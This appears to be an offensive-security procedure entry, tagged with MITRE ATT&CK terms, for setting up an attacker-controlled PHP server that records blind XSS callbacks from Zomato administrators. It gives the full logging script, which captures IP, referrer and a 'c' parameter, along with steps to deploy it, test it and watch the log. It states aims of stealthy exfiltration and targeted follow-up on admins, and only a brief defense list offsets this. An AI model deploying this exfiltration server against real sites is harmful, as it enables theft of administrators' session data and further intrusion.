---
id: proc-zomato-php-logger
tags:
  - php
  - logging-server
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/php-zomato-logger]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.126Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Set-Up-PHP-Logging-Server-for-XSS-Capture

## Summary

This procedure deploys a simple PHP script on an attacker-controlled server to log incoming requests triggered by the XSS payload, capturing execution evidence such as admin IP and referrer for verification and potential further exploitation.

## Description

To confirm blind XSS execution, the payload includes an img tag that loads a resource from the attacker's server, triggering a GET request. The PHP script logs key details to a file, enabling the attacker to monitor for admin interactions without direct access to Zomato. This setup uses standard PHP server variables and file operations, assuming a basic web server like Apache with PHP enabled.

## Requirements

1. Attacker-controlled server with PHP (e.g., VPS with Apache/Nginx + PHP)
2. Web-accessible directory for the script
3. Write permissions for log file creation
4. Public IP or domain for the server

## Defense

Defensive measures and detection strategies:

- Block or monitor outbound requests to unknown external domains from web apps
- Use web application firewalls (WAF) to detect anomalous img src or script loads
- Regularly audit server logs for unexpected PHP executions or file writes

## Objectives

1. Capture proof of XSS execution via logged requests
2. Collect admin browser details for targeted follow-up
3. Enable stealthy data exfiltration channel

## Instructions

### Step 1: Create PHP Script

**Context**: Write the logging script to handle GET requests.

Create file `zomato.php` with the following content using [[commands/php-zomato-logger]]:

```php
<?php
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'unknown';
$c = $_GET['c'] ?? 'unknown';
$log = "[$time] IP: $ip | Referer: $referer | Param c: $c\n";
file_put_contents('log.txt', $log, FILE_APPEND);
?>
```

> Expected output: Script saved, returns blank page on access to avoid suspicion.

### Step 2: Deploy and Test Server

**Context**: Place script on web server and verify accessibility.

Upload `zomato.php` to the server's document root. Access http://<my_server_ip>/zomato.php?c=test via browser.

> Expected output: No visible output, but check log.txt for entry like "[time] IP: x.x.x.x | Referer: browser-url | Param c: test".

### Step 3: Monitor Logs

**Context**: Prepare for incoming XSS triggers.

Tail the log.txt file to watch for requests.

> Expected output: New entries upon successful XSS execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/php-zomato-logger]]

## Tools Used


## Tags

- php-script
- logging
- capture
